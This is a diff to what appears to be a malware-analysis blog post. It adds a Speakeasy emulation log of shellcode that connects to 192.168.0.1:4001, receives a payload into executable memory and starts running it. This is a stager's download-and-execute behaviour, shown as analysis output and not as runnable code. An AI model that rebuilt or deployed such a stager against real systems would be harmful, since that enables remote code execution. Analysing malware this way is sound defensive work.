@@ -104,6 +104,23 @@ By taking the Hex contents of the first PUSH instruction, after 68 (Which is jus
 
 ![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/b72c9cec-eb6f-40bf-9f31-56d0b864d465)
 
+Alternatively, we can use Speakeasy:
+
+![image](https://github.com/MZHeader/MZHeader.github.io/assets/151963631/4a3deab4-3618-4d5f-a89c-ab3a89abab82)
+
+```
+* exec: shellcode
+0x10aa: 'kernel32.LoadLibraryA("ws2_32")' -> 0x78c00000
+0x10ba: 'ws2_32.WSAStartup(0x190, 0x1203e4c)' -> 0x0
+0x10d7: 'ws2_32.WSASocketA("AF_INET", "SOCK_STREAM", 0x0, 0x0, 0x0, 0x0)' -> 0x4
+0x10e3: 'ws2_32.connect(0x4, "192.168.0.1:4001", 0x10)' -> 0x0
+0x1100: 'ws2_32.recv(0x4, 0x1203e40, 0x4, 0x0)' -> 0x4
+0x1113: 'kernel32.VirtualAlloc(0x0, 0x8, 0x1000, "PAGE_EXECUTE_READWRITE")' -> 0x50000
+0x1121: 'ws2_32.recv(0x4, 0x50000, 0x8, 0x0)' -> 0x8
+0x50008: Unhandled interrupt: intnum=0x3
+0x50008: shellcode: Caught error: unhandled_interrupt
+* Finished emulating
+```
 
 
 
